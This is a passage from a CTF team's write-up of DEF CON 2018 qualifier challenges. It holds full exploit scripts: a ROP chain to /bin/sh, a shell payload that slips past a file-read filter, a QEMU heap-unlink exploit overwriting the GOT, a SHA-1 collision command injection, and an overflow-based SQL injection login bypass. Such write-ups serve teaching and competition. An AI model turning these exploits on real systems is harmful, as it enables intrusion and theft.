+4 and +7), and make the program jump 7 bytes before the gadget (specifically at libc_base + 0xf1140) when the tampered opendir function gets called.\nJumping at 0xf1140 shuffles the cards in the deck a little bit, but it really isn\u0026rsquo;t a problem:\nf1140: 24 60 and al,0x60 f1142: e8 99 67 00 00 call f78e0 \u0026lt;__close@@GLIBC_2.2.5\u0026gt; f1147: 48 8b 05 6a 2d 2d 00 mov rax,QWORD PTR [rip+0x2d2d6a] # 3c3eb8 \u0026lt;__environ@@GLIBC_2.2.5-0x3080\u0026gt; ... As you can see, before the gedget there\u0026rsquo;s a dirty little mov al,0x60, but we don\u0026rsquo;t care about it because we have a mov rax, \u0026lt;stuff\u0026gt; right after wich resets rax, and also a call to __close@@GLIBC_2.2.5: this call could actually do something unexpected.\nAnyway, running the exploit locally gave us a functioning shell, so we ran it remotely, and\u0026hellip; the server hangs waiting for input, success! Well, actually not really: no output was being sent back to us because the call to __close was closing stdout right before executing the shell. Not a problem, we still have stderr! Now, since the remote shell is dash, we first ran bash and then tried to run cat secret_flag.txt \u0026gt;\u0026amp;2, followed by two exit. The wrapper complained: it had detected that we were trying to get the content of a local file and blocked us. To circumvent this check we just put the content of the flag in a local variable and used echo to write its content splitted in three parts:\nFLAG=$(cat secret_flag.txt) echo ${FLAG:0:5} \u0026gt;\u0026amp;2 echo ${FLAG:5:5} \u0026gt;\u0026amp;2 echo ${FLAG:10:5} \u0026gt;\u0026amp;2 Ta da! Got the flag! Here\u0026rsquo;s the final output of our exploit:\n$ ./expl.py [+] Opening connection to 61421a06.quals2018.oooverflow.io on port 5566: Done [+] Solving proof of work: done (359477). [*] Flipping bits: 0x3fcc, 0x3fcf, 0x3fd1 [*] Waiting for shell to run... [*] Sending payload: FLAG=$(cat secret_flag.txt) echo ${FLAG:0:5} \u0026gt;\u0026amp;2 echo ${FLAG:5:5} \u0026gt;\u0026amp;2 echo ${FLAG:10:5} \u0026gt;\u0026amp;2 [+] Receiving all data: Done (251B) [*] Closed connection to 61421a06.quals2018.oooverflow.io port 5566 3 bits have been flipped MD5 of the new version: 3e126b5008b69f13559c49657a15f5fa Let me run the program for you now... ------------------------------------------------------- bitfl ip_ma dness ------------------------------------------------------- [+] Gottem! Flag: bitflip_madness.\nCode # Code of the exploit:\n#!/usr/bin/env python2 from __future__ import print_function from pwn import * from time import sleep import hashlib def pow_hash(challenge, solution): return hashlib.sha256(challenge.encode(\u0026#39;ascii\u0026#39;) + p64(solution)).hexdigest() def check_pow(challenge, n, solution): h = pow_hash(challenge, solution) return (int(h, 16) % (2**n)) == 0 def solve_pow(challenge, n): candidate = 0 while not check_pow(challenge, n, candidate): candidate += 1 return candidate def connect_and_solve_pow(): conn = remote(\u0026#39;61421a06.quals2018.oooverflow.io\u0026#39;, 5566) conn.recvuntil(\u0026#39;Challenge: \u0026#39;) c = conn.recvline().strip() conn.recvuntil(\u0026#39;n: \u0026#39;) n = int(conn.recvline().strip()) pow_progress = log.progress(\u0026#39;Solving proof of work\u0026#39;) pow_progress.status(\u0026#39;hang tight...\u0026#39;) sol = solve_pow(c, n) pow_progress.success(\u0026#39;done (%d).\u0026#39;, sol) conn.sendline(str(sol)) return conn BITS_TO_FLIP = [ 0x7f9*8 + 4, 0x7f9*8 + 7, 0x7fa*8 + 1 ] PAYLOAD = \u0026#34;\u0026#34;\u0026#34;FLAG=$(cat secret_flag.txt) echo ${FLAG:0:5} \u0026gt;\u0026amp;2 echo ${FLAG:5:5} \u0026gt;\u0026amp;2 echo ${FLAG:10:5} \u0026gt;\u0026amp;2 \u0026#34;\u0026#34;\u0026#34; r = connect_and_solve_pow() log.info(\u0026#39;Flipping bits: %s\u0026#39;, \u0026#39;, \u0026#39;.join(map(hex, BITS_TO_FLIP))) r.recvuntil(\u0026#39;introduce? \u0026#39;) r.sendline(str(len(BITS_TO_FLIP))) for b in BITS_TO_FLIP: r.recvuntil(\u0026#39;(0-81727)? \u0026#39;) r.sendline(str(b)) log.info(\u0026#39;Waiting for shell to run...\u0026#39;) sleep(1) log.info(\u0026#39;Sending payload: %s\u0026#39;, PAYLOAD) r.sendline(\u0026#39;bash\u0026#39;) r.sendline(PAYLOAD) r.sendline(\u0026#39;exit\u0026#39;) r.sendline(\u0026#39;exit\u0026#39;) output = r.recvall() print(\u0026#39;\u0026#39;, output, sep=\u0026#39;\\n\u0026#39;) log.success(\u0026#39;Gottem!\u0026#39;) r.close() Ddtek: Preview # The challenge presents us with the \u0026ldquo;preview\u0026rdquo; binary and the libc.so.6 file. The binary allow us to view the first 7 lines of any file specified in the input with the format \u0026ldquo;HEAD filename\u0026rdquo;, if the file has less than 7 lines, it will not be printed. That means the flag file is not accessible.\nA quick look at the binary in ida, reveals us that the file is behaving like an unpacker, it loads ld.so.2 at a random address and makes it load the main binary in another random address. Furthermore we can see that the main function has a clear stack overflow. But the binary has the canary\u0026hellip;\nExamining the unpacked behavior we see that the random position where the binary loads are taken from the AT_RANDOM entry of the auxiliary vector. So if we know where the program is loaded we leak also the canary, since the loader takes the canary value from the very same bytes.\nAfter some thinking we found that the binary let\u0026rsquo;s us read /proc/self/maps: BINGO! Fortunately the first seven entries printed match with the address of the binary and ld, that combined correspond with the canary. Now OVERFLOW+CANARY+PAD+ROPCHAIN_ON_LD gives us the desired shell!\nfrom struct import pack from pwn import * import base64 import sys import time import os host = \u0026#39;cee810fa.quals2018.oooverflow.io\u0026#39; port = 31337 def pow_hash(challenge, solution): return hashlib.sha256(challenge.encode(\u0026#39;ascii\u0026#39;) + struct.pack(\u0026#39;\u0026lt;Q\u0026#39;, solution)).hexdigest() def check_pow(challenge, n, solution): h = pow_hash(challenge, solution) return (int(h, 16) % (2**n)) == 0 def solve_pow(challenge, n): candidate = 0 while True: if check_pow(challenge, n, candidate): return candidate candidate += 1 def connect(): global conn conn.close() conn = remote(host,port) conn.recvuntil(\u0026#39;Challenge: \u0026#39;) challenge = conn.recvuntil(\u0026#39;\\n\u0026#39;)[:-1] conn.recvuntil(\u0026#39;n: \u0026#39;) n = int(conn.recvuntil(\u0026#39;\\n\u0026#39;)[:-1]) solution = solve_pow(challenge, n) conn.sendline(str(solution)) conn = remote(host,port) connect() conn.sendline(\u0026#34;HEAD /proc/self/maps\u0026#34;) conn.recvuntil(\u0026#34;preview:\\n\u0026#34;) canary_low = 0 canary_high = 0 writable_spot = 0 for x in range(7): line = conn.recvuntil(\u0026#34;\\n\u0026#34;) if \u0026#34;ld\u0026#34; in line and canary_high == 0 and \u0026#34;x\u0026#34; in line: ld = int(line.split(\u0026#34;-\u0026#34;)[0], 16) canary_high = line.split(\u0026#34;-\u0026#34;)[0][:-3] if canary_low == 0 and \u0026#34;ld\u0026#34; not in line and \u0026#34;x\u0026#34; in line: canary_low = line.split(\u0026#34;-\u0026#34;)[0][:-3] if writable_spot == 0 and \u0026#34;rw\u0026#34; in line and \u0026#34;ld\u0026#34; in line: writable_spot = int(line.split(\u0026#34;-\u0026#34;)[0], 16) canary = \u0026#34;0x%s%s00\u0026#34; % (canary_high, canary_low) print \u0026#34;The canary is \u0026#34;, canary canary = int(canary, 16) print (\u0026#34;%x\u0026#34; % canary) IMAGE_BASE_0 = ld # ld-linux-x86-64.so.2 WRITABLE_OFFSET_0 = writable_spot - ld WRITABLE_OFFSET_1 = WRITABLE_OFFSET_0 + 8 rebase_0 = lambda x : p64(x + IMAGE_BASE_0) print \u0026#34;IMAGE_BASE 0x%x\u0026#34; % IMAGE_BASE_0 rop = \u0026#39;\u0026#39; rop += rebase_0(0x0000000000002112) # 0x0000000000002112: pop rdi; ret; rop += \u0026#39;/bin/sh\\x00\u0026#39; rop += rebase_0(0x00000000000106ca) # 0x00000000000106ca: pop rsi; ret; rop += rebase_0(WRITABLE_OFFSET_0) rop += rebase_0(0x000000000001a247) # 0x000000000001a387: mov qword ptr [rsi], rdi; xor eax eax; ret; rop += rebase_0(0x0000000000002112) # 0x0000000000002112: pop rdi; ret; rop += rebase_0(WRITABLE_OFFSET_0) rop += rebase_0(0x00000000000106ca) # 0x00000000000106ca: pop rsi; ret; rop += p64(0x0) rop += rebase_0(0x0000000000000d5e) # 0x0000000000000d5e: pop rax; pop rdx; pop rbx; ret; rop += p64(0x000000000000003b) rop += p64(0x0) rop += p64(0x0) rop += rebase_0(0x000000000001b605) # 0x000000000001b605: syscall; ret; payload = (\u0026#34;A\u0026#34;*0x58) + p64(canary) + \u0026#34;A\u0026#34;*8 + rop assert \u0026#34;\\n\u0026#34; not in payload assert len(payload) \u0026lt;= 256 conn.sendline(payload) conn.sendline(\u0026#34;cat flag\u0026#34;) conn.interactive() Flag: OOO{ZOMG, WhAT iF order-of-the-overfow IS ddtek?!?!?!? Plot Twist!}\nEasy Pisy # We were given a website with two PHP files: sign.php and execute.php, as well as two example PDF files.\nLooking at the source code, which was available, the sign.php endpoint received a PDF file, extracted the text using ocrad, an OCR software, signed it using openssl_sign with a private key that, of course, we could not access, and returned the signature. The server signed only files containing the text ECHO (but not EXECUTE).\nThe execute.php endpoint received via a POST request a file, userfile, and a signature, signature, verified the signature using openssl_verify, and extracted the text using the same pdf_to_text function used in sign.php. Then, if the text starts with ECHO, it just prints the OCRed text; instead, if the text starts with EXECUTE, it passes the OCRed text to shell_exec.\nClearly, we must find a way to sign a PDF file containing an image of a text that starts with EXECUTE, but our signing endpoint refuses to sign files that start with EXECUTE.\nLooking at the PHP documentation for openssl_sign(), we observe that the default algorithm (the one it\u0026rsquo;s used) is SHA1. Thus, we immediately thought of the (not-so-recently-discovered-anymore) SHA-1 collision technique (https://shattered.io/static/shattered.pdf). Indeed, if we could create two different PDF files that hash to the same SHA1 value, we could execute arbitrary commands and cat our flag.\nTo create colliding PDFs, we used this online SHA collider: https://alf.nu/SHA1 to obtain two files echo.pdf and execute.pdf, one with a harmless ECHO /bin/cat flag; command, and the other one with EXECUTE /bin/cat flag;, both with the same SHA1 hash.\nOnce we have the two colliding files, it is only a matter of:\ncurl -F \u0026#34;userfile=@echo.pdf\u0026#34; http://5a7f02d0.quals2018.oooverflow.io/sign.php to sign the harmless file:\nExecuting \u0026#39;convert -depth 8 /tmp/phpMWWbFu.pdf /tmp/phpMWWbFu.ppm\u0026#39;\u0026lt;br/\u0026gt;Executing \u0026#39;ocrad /tmp/phpMWWbFu.ppm\u0026#39;\u0026lt;br/\u0026gt;Extracted text: \u0026#34;ECHO /bin/cat flag;\u0026#34;\u0026lt;br/\u0026gt;I\u0026#39;m OK with ECHO commands. Here is the signature: \u0026lt;br/\u0026gt;819c7fd2fc0b00849e01a1f5825001684b51f3e8664c004fc08e64b60c67a1efc9fd2ef030fc1e3458fee51a10aa2b1c9e125f49c6757ded05da9b6f050d8c625262654b68d24042cff1645230d1b3a51b51bc9eebc34d6c7c2759b50b050176ce0cea61dd3748d4a075ecf67767eb4f853ed8b741b8e3e7ebd66b34321af4b789f9b39e72c46d88be2beb84d32a844b76ca96685fa54590462af035d508947fb1d5bcf20b0592b77d9ab70e4f2c6d8995f50469befce3c9372b56c3b5d8ccd48b220a96fdf29b7b2499f49bf7d9fb3c87e3dfa3fa818561739b89b3aae54f4ce5e6c24d012598009fa3cddf12ae94f2d3554d22fdba379105c5fe6b1b71abd0 At this point,\ncurl -F \u0026#34;userfile=@execute.pdf\u0026#34; -F \u0026#34;signature=`cat signature.txt`\u0026#34; http://5a7f02d0.quals2018.oooverflow.io/execute.php leads to the flag:\nSignature is OK.\u0026lt;br/\u0026gt;Executing \u0026#39;convert -depth 8 /tmp/php2dqia6.pdf /tmp/php2dqia6.ppm\u0026#39;\u0026lt;br/\u0026gt;Executing \u0026#39;ocrad /tmp/php2dqia6.ppm\u0026#39;\u0026lt;br/\u0026gt;Text: \u0026#34;EXECUTE /bin/cat flag;\u0026#34;\u0026lt;br/\u0026gt;About to execute: \u0026#34;/bin/cat flag;\u0026#34;.\u0026lt;br/\u0026gt;Output: OOO{phP_4lw4y5_d3l1v3r5_3h7_b35T_fl4g5} Flag: OOO{phP_4lw4y5_d3l1v3r5_3h7_b35T_fl4g5}\nElastic Cloud Compute # For this challenge we were provided with a custom qemu binary and a barebones linux image.\nSince the challenge description mentions \u0026ldquo;extra PCI devices\u0026rdquo; we started looking around in the qemu binary. Searching for interesting strings in the qemu binary let us find the functions that handle the additional driver (containing \u0026ldquo;ooo_class_init\u0026rdquo;).\nLooking online for guides on how to add devices to qemu we actually found the source code the driver was based on: this really helped in reversing the binary more quickly.\nThe driver handles writes and reads to its mapped memory by mallocing memory and writing and reading data in the heap. It\u0026rsquo;s easy to spot a problem: there is no bound checking on either of them. We can write and read on the heap with a range of 16 bits of offset, more than enough to corrupt the chunk headers and perform some heap exploitation.\nA good target for our memory corruption is the array where the malloced pointers are saved, which is located in the bss. Controlling them would mean choosing where to read and write when accessing the driver\u0026rsquo;s memory.\nTo manage this we exploited the unlink macro in the free call.\nWe allocate two consecutive chunks, then forge a fake chunk and store it in the first chunk\u0026rsquo;s content space. We overwrite the prev_size header of the second chunk to make it look like the chunk preceding it is our forged chunk, and we unset the prev_inuse flag for the second chunk. We then free the second chunk, which in turn triggers a consolidation with our fake chunk.\nBy accurately writing all the size fields and the target pointers, all security checks pass and the unlink macro overwrites the pointer in the bss, which now points to the bss itself. We can now write directly on the bss and edit the pointers, which therefore means we managed to obtain an arbitrary write primitive.\nTo finish the challenge we simply overwrite the GOT entry of free with the function that prints the flag. We trigger a call to free and obtain the flag.\nP.S. We had some issues trying to compile and/or execute our exploit inside qemu. We managed to make it run with some glorified copy and paste.\nExploit to be run inside qemu:\n/* Basic PCI communication template from https://github.com/billfarrow/pcimem/blob/master/pcimem.c Unlink exploit written following https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;termios.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #define PRINT_ERROR \\ do { \\ fprintf(stderr, \u0026#34;Error at line %d, file %s (%d) [%s]\\n\u0026#34;, \\ __LINE__, __FILE__, errno, strerror(errno)); exit(1); \\ } while(0) // map 24 bit address space #define MAP_SIZE 16777216UL #define MAP_MASK (MAP_SIZE - 1) void pci_read(void *map_base, off_t target, int access_type) { int type_width; int64_t read_result; void *virt_addr; virt_addr = map_base + (target \u0026amp; MAP_MASK); switch(access_type) { case \u0026#39;b\u0026#39;: read_result = *((uint8_t *) virt_addr); type_width = 2; break; case \u0026#39;h\u0026#39;: read_result = *((uint16_t *) virt_addr); type_width = 4; break; case \u0026#39;w\u0026#39;: read_result = *((uint32_t *) virt_addr); type_width = 8; break; case \u0026#39;d\u0026#39;: read_result = *((uint64_t *) virt_addr); type_width = 16; break; default: fprintf(stderr, \u0026#34;Illegal data type \u0026#39;%c\u0026#39;.\\n\u0026#34;, access_type); exit(2); } printf(\u0026#34;Value at offset 0x%X (%p): 0x%0*lX\\n\u0026#34;, (int) target, virt_addr, type_width, read_result); fflush(stdout); } void pci_write(void *map_base, off_t target, int access_type, int64_t writeval) { int type_width = 16; int64_t read_result; void *virt_addr; virt_addr = map_base + (target \u0026amp; MAP_MASK); // printf(\u0026#34;Virt addr %p\\n\u0026#34;, virt_addr); // printf(\u0026#34;Writeval %x\\n\u0026#34;, writeval); switch(access_type) { case \u0026#39;b\u0026#39;: *((uint8_t *) virt_addr) = writeval; break; case \u0026#39;h\u0026#39;: *((uint16_t *) virt_addr) = writeval; break; case \u0026#39;w\u0026#39;: *((uint32_t *) virt_addr) = writeval; break; case \u0026#39;d\u0026#39;: *((uint64_t *) virt_addr) = writeval; break; } // printf(\u0026#34;Written 0x%0*lX\\n\u0026#34;, type_width, // writeval, type_width, read_result); fflush(stdout); } // write/read address is like [opcode, 4bit][memid, 4bit][subaddress, 16bit] // malloc: write to memory with opcode 0 void mall(void *map_base, int index, int size) { // malloc size = valtowrite * 8 off_t target = ((index \u0026amp; 0xF) \u0026lt;\u0026lt; 16); pci_write(map_base, target, \u0026#39;w\u0026#39;, size / 8); }\t// write to pointed area: write to memory with opcode 2 void write_heap(void *map_base, int index, int64_t writeval, int offset) { // offset is a 16 bit value off_t target = offset | ((index \u0026amp; 0xF) \u0026lt;\u0026lt; 16) | ((2 \u0026amp; 0xF) \u0026lt;\u0026lt; 20); pci_write(map_base, target, \u0026#39;w\u0026#39;, writeval); } // free: write to memory with opcode 1 void myfree(void *map_base, int index) { off_t target = ((index \u0026amp; 0xF) \u0026lt;\u0026lt; 16) | ((1 \u0026amp; 0xF) \u0026lt;\u0026lt; 20); pci_write(map_base, target, \u0026#39;w\u0026#39;, 0); } // read from pointer: read memory void myread(void *map_base, int index, int offset) { // read 4 bytes, unused off_t target = ((index \u0026amp; 0xF) \u0026lt;\u0026lt; 16) | offset; pci_read(map_base, target, \u0026#39;d\u0026#39;); } int main(int argc, char **argv) { int fd; void *map_base; char *filename; off_t target; int access_type = \u0026#39;w\u0026#39;; filename = \u0026#34;/sys/devices/pci0000:00/0000:00:04.0/resource0\u0026#34;; target = 0x0; access_type = \u0026#39;w\u0026#39;; argc = 0; if((fd = open(filename, O_RDWR | O_SYNC)) == -1) PRINT_ERROR; printf(\u0026#34;%s opened.\\n\u0026#34;, filename); printf(\u0026#34;Target offset is 0x%x, page size is %ld\\n\u0026#34;, (int) target, sysconf(_SC_PAGE_SIZE)); fflush(stdout); // map device memory printf(\u0026#34;mmap(%d, %ld, 0x%x, 0x%x, %d, 0x%x)\\n\u0026#34;, 0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, (int) target); map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target \u0026amp; ~MAP_MASK); if(map_base == (void *) -1) PRINT_ERROR; printf(\u0026#34;PCI Memory mapped to address 0x%08lx.\\n\u0026#34;, (unsigned long) map_base); fflush(stdout); printf(\u0026#34;Clearing bins\\n\u0026#34;); // clear malloc bins to make sure we will have consecutive chunks int i; for (i = 0; i \u0026lt; 2000; i++) mall(map_base, i % 4, 0x80); // we now have some heap pointers at the indexes 0,1,2,3 printf(\u0026#34;Starting exploit\\n\u0026#34;); // struct chunk_structure { // size_t prev_size; // size_t size; // struct chunk_structure *fd; // struct chunk_structure *bk; // char buf[10]; // padding // }; // First forge a fake chunk starting at chunk1 // Need to setup fd and bk pointers to pass the unlink security check //fake_chunk = (struct chunk_structure *)chunk1; //fake_chunk-\u0026gt;fd = (struct chunk_structure *)(\u0026amp;chunk1 - 3); // Ensures P-\u0026gt;fd-\u0026gt;bk == P //fake_chunk-\u0026gt;bk = (struct chunk_structure *)(\u0026amp;chunk1 - 2); // Ensures P-\u0026gt;bk-\u0026gt;fd == P // fake chunk prev_size = 0 (probably not needed) write_heap(map_base, 0, 0, 0); write_heap(map_base, 0, 0, 4); // fake chunk size = 0x80, NON_MAIN_ARENA and PREV_INUSE flags are set write_heap(map_base, 0, 0x85, 8); write_heap(map_base, 0, 0, 12); // write \u0026amp;chunk1 - 3 (0x1317928) in chunk1 + 16 write_heap(map_base, 0, 0x1317928, 16); // write \u0026amp;chunk1 - 2 (0x1317930) in chunk1 + 24 write_heap(map_base, 0, 0x1317930, 24); // Next modify the header of chunk2 to pass all security checks //chunk2_hdr = (struct chunk_structure *)(chunk2 - 2); //chunk2_hdr-\u0026gt;prev_size = 0x80; // chunk1\u0026#39;s data region size //chunk2_hdr-\u0026gt;size \u0026amp;= ~1; // Unsetting prev_in_use bit // chunk2 prev_size = 0x80 write_heap(map_base, 0, 0x80, 0x80); // unset PREV_INUSE bit for chunk2 write_heap(map_base, 0, 0x94, 0x88); // Now, when chunk2 is freed, attacker\u0026#39;s fake chunk is \u0026#39;unlinked\u0026#39; // This results in chunk1 pointer pointing to chunk1 - 3 // i.e. chunk1[3] now contains chunk1 itself. // We then make chunk1 point to some victim\u0026#39;s data //free(chunk2); myfree(map_base, 1); printf(\u0026#34;Pointer overwritten\\n\u0026#34;); // overwrite pointer at index 1 with the address of free@GOT write_heap(map_base, 0, 0x011301A0, 32); write_heap(map_base, 0, 0, 36); // overwrite GOT entry of free with our target function write_heap(map_base, 1, 0x6e65f9, 0); write_heap(map_base, 1, 0, 4); printf(\u0026#34;Reading flag\\n\u0026#34;); myfree(map_base, 0); if(munmap(map_base, MAP_SIZE) == -1) PRINT_ERROR; close(fd); return 0; } Script to load the exploit in qemu and execute it:\n#!/usr/bin/env python from __future__ import print_function import sys import struct import hashlib from pwn import * import base64 import subprocess from time import sleep host = \u0026#39;11d9f496.quals2018.oooverflow.io\u0026#39; port = 31337 def chunkstring(string, length): return (string[0+i:length+i] for i in range(0, len(string), length)) def buildexploit(): subprocess.check_call(\u0026#34;musl-gcc exploit.c -Os -static -o exploit\u0026#34;,shell=True) subprocess.check_call(\u0026#34;tar cfz exploit.tar.gz exploit\u0026#34;,shell=True) with open(\u0026#34;./exploit.tar.gz\u0026#34;, \u0026#34;rb\u0026#34;) as f: exploit = f.read() b64exploit = base64.b64encode(exploit) exploit.encode(\u0026#34;base64\u0026#34;) return b64exploit def exploit(send): exp = buildexploit() sleep(10) print(\u0026#34;chunks...\u0026#34;) i = 0 for chunk in chunkstring(exp, 700): sleep(2) print(i) i += 1 send(\u0026#34;echo -n \\\u0026#34;{}\\\u0026#34; \u0026gt;\u0026gt; exploitb64\u0026#34;.format(chunk)) sleep(1) print(\u0026#34;almost\u0026#34;) send(\u0026#34;base64 -d exploitb64 \u0026gt; ./exploit.tar.gz\u0026#34;) sleep(1) send(\u0026#34;tar xf exploit.tar.gz\u0026#34;) sleep(1) send(\u0026#34;chmod +x ./exploit\u0026#34;) sleep(1) send(\u0026#34;ls\u0026#34;) sleep(1) send(\u0026#34;./exploit\u0026#34;) def pow_hash(challenge, solution): return hashlib.sha256(challenge.encode(\u0026#39;ascii\u0026#39;) + struct.pack(\u0026#39;\u0026lt;Q\u0026#39;, solution)).hexdigest() def check_pow(challenge, n, solution): h = pow_hash(challenge, solution) return (int(h, 16) % (2**n)) == 0 def solve_pow(challenge, n): candidate = 0 while True: if check_pow(challenge, n, candidate): return candidate candidate += 1 if __name__ == \u0026#39;__main__\u0026#39;: conn = remote(host,port) conn.recvuntil(\u0026#39;Challenge: \u0026#39;) challenge = conn.recvuntil(\u0026#39;\\n\u0026#39;)[:-1] conn.recvuntil(\u0026#39;n: \u0026#39;) n = int(conn.recvuntil(\u0026#39;\\n\u0026#39;)[:-1]) print(\u0026#39;Solving challenge: \u0026#34;{}\u0026#34;, n: {}\u0026#39;.format(challenge, n)) solution = solve_pow(challenge, n) print(\u0026#39;Solution: {} -\u0026gt; {}\u0026#39;.format(solution, pow_hash(challenge, solution))) conn.sendline(str(solution)) exploit(conn.sendline) conn.interactive() ELF Crumble # The challenge present us with 8 fragment files and a \u0026ldquo;broken\u0026rdquo; binary. A quick view of the binary shows that the first part is missing and replaced with X:\n000005a0 55 89 e5 5d e9 57 ff ff ff 8b 14 24 c3 58 58 58 |U..].W.....$.XXX| 000005b0 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| * 000008d0 58 58 58 58 8b 04 24 c3 66 90 66 90 66 90 66 90 |XXXX..$.f.f.f.f.| 000008e0 55 57 56 53 e8 c7 fb ff ff 81 c3 e7 16 00 00 83 |UWVS............| Without thinking too much we launched a bruteforce script:\nfrom pwn import * from itertools import permutations from subprocess import Popen import os from tqdm import tqdm def make_executable(path): mode = os.stat(path).st_mode mode |= (mode \u0026amp; 0o444) \u0026gt;\u0026gt; 2 # copy R bits to X os.chmod(path, mode) fragments = [] for i in range(8): with open(\u0026#39;./fragment_\u0026#39;+ str(i+1)+\u0026#39;.dat\u0026#39;,\u0026#39;r\u0026#39;) as f: fragments.append(f.read()) fragments = reversed(fragments) for p in permutations(fragments): with open(\u0026#39;broken\u0026#39;,\u0026#39;r\u0026#39;) as b: bytes = b.read() with open(\u0026#39;try\u0026#39;,\u0026#39;w\u0026#39;) as t: t.write(bytes.replace(\u0026#39;X\u0026#39;*(0x8d4-0x5ad), \u0026#39;\u0026#39;.join(p))) make_executable(\u0026#39;try\u0026#39;) p = subprocess.Popen([\u0026#34;./try\u0026#34;], stdout=subprocess.PIPE) out, err = p.communicate() if(len(out)\u0026gt;0): print out This quickly prints out the flag.\nExzendtential-crisis # We are given a site with two forms in the homepage: one to register an account, and one to login to an account. There is also a \u0026ldquo;debug me\u0026rdquo; link that shows the source code of the page.\nOnce we register an account, we can write an essay on the page essays.php. This page lists all the essays that the user wrote, and provides a preview. Appending ?source to the url shows the page source (as in index.php). There is an obvious file disclosure:\nif (isset($_GET[\u0026#39;preview\u0026#39;])) { $dirname = \u0026#34;upload/${_SESSION[\u0026#39;userid\u0026#39;]}/\u0026#34;; $fname = $_GET[\u0026#39;name\u0026#39;]; if (check_fname($fname) === False) { header(\u0026#34;Location: /essays.php\u0026#34;); exit(); } $content = file_get_contents($dirname . $fname, False, NULL, 0, 524288); echo \u0026#34;\u0026lt;h1\u0026gt;Your essay submission\u0026lt;/h1\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; echo $content; echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;a href=\u0026#39;essays.php\u0026#39;\u0026gt;back\u0026lt;/a\u0026gt;\u0026#34;; exit(); } There is also a flag.php file, that only says:\nOnly sarte knows the flag. You are not him. Enjoy a quote though: One love, a career, a revolution, as many companies as we begin ignoring their outcome Retrieving php.ini with the file disclousure shows that there is a custom module in the PHP installation, called mydb.so. With the file disclousure we downloaded the module, and then we started reversing it.\nAfter reversing the module, we find that it exports 3 functions to PHP: create_user, get_result (both used in register.php), and check_credentials (used in login.php). Internally, the module uses SQLite for storing user credentials, without validating the input (this is done on the PHP-side). After looking a bit, we found an out-of-bounds write vulnerability that we can use to inject arbitrary SQL into a query. In check_credentials, the module first retrieves the function arguments, and then calls get_user_id in order to verify the username/password. It passes to it a callback function, check_hacking_attempt, that takes two buffers, one containing the username, and one to copy the username to. It does some security checks before sending a query to SQLite. check_hacking_attempt copies the username string to the destination buffer, as long as its length is less than 150 characters. However, the destination buffer resides in the stack frame of get_user_id, which only allocated 112 bytes for it. Therefore, there is a 38 byte overflow.\nIn get_user_id, the destination buffer is located just before a table name buffer, which contains the name of the table used in the user selection query. By overwriting the table name, we can inject arbitrary SQL into the query. The injection that we choose is pretty trivial: users where username=\u0026quot;sarte\u0026quot; -- .\nThe final payload is generated by the Python snippet print('a' * 112 + 'users where username=\u0026quot;sarte\u0026quot; -- '), that once inserted as username in the login, authenticates us as sarte. We can now retrieve the flag.\nFlagsifier # This challenge consisted in finding the correct input for a Deep Neural Network that classifies images (size: 1064x28) and has 40 output neurons.\nThere were some example images, composed of 38 letters from what looked like the EMNIST dataset. All of them activated the fourth neuron, therefore being classified as the fourth class.\nSome quick tests by moving around random letters and removing some others (plus, the structure of the network) hinted us that there was a softmax and the classes were represented as one-hot encoding. Therefore, the network classifies images into 40 classes. Time to discover what they are!\nSo, at first we transcribed the sample images and used the combination of tile + corresponding text as dataset.\ndataname=[\u0026#34;RUNNEISOSTRICHESOWNINGMUSSEDPURIMSCIVI\u0026#34;, \u0026#34;MOLDERINGIINTELSDEDUCINGCOYNESSDEFIECT\u0026#34;, \u0026#34;AMADOFIXESINSTIIIINGGREEDIIVDISIOCATIN\u0026#34;, \u0026#34;HAMIETSENSITIZINGNARRATIVERECAPTURINGU\u0026#34;, \u0026#34;ELECTROENCEPHALOGRAMSPALATECONDOIESPEN\u0026#34;, \u0026#34;SCHWINNUFAMANAGEABLECORKSSEMICIRCLESSH\u0026#34;, \u0026#34;BENEDICTTURGIDITYPSYCHESPHANTASMAGORIA\u0026#34;, \u0026#34;TRUINGAIKALOIDSQUEILRETROFITBIEARIESTW\u0026#34;, \u0026#34;KINGFISHERCOMMONERSUERIFIESHORNETAUSTI\u0026#34;, \u0026#34;LIQUORHEMSTITCHESRESPITEACORNSGOALREDI\u0026#34;] (Finding typos in this transcription is left as an exercise to the reader \u0026#x1f604; )\nAfter that we divided all the sample images in 38 28x28-tiles (one tile per letter). We have done that using this script:\ndataset=[] datalet=[] datax={} for i in range(0,8): img = Image.open(\u0026#39;./sample_%d.png\u0026#39;%i) for j in range(0,38): x=img.crop((j*28,0,(j+1)*28,28)) dataset.append(x) datalet.append(dataname[i][j]) let=dataname[i][j] if let not in datax: datax[let] = [] datax[let].append(len(dataset)-1) dataset contains the images. datalet[i] contains the corresponding text of dataset[i]. datax contains the mapping between letters and array of samples. Basically it answers to questions like: \u0026ldquo;which dataset entries correspond to a particular letter?\u0026rdquo; Then, we experimented as follows: for each letter, starting from a black image, put the letter in position 0\u0026hellip;38, and classify these images. We saved all the predictions, and then averaged them to see the most likely class for each letter.\nWe discovered that neurons 14\u0026hellip;40 clasified letters: neuron 14 activated for A, neuron 15 for B, up to neuron 40 for Z.\nWe then need to discover what the neurons 1\u0026hellip;14 classify, as some of them probably classify the flag. To do that, we need to try to find inputs that maximize the activation of these, one at a time. Another thing that we can leverage is that the flag likely starts by OOO.\nSo, what would one usually do here, with a \u0026ldquo;real\u0026rdquo; network? Decide which neuron (e.g., the first) to try to activate, then create random 38-letters inputs, and then use the log-likelihood of that neuron for that input as the fitness function for his favourite optimization algorithm (e.g., this problem looked perfect for genetic algorithms).\nBut before throwing cannons to the problem, 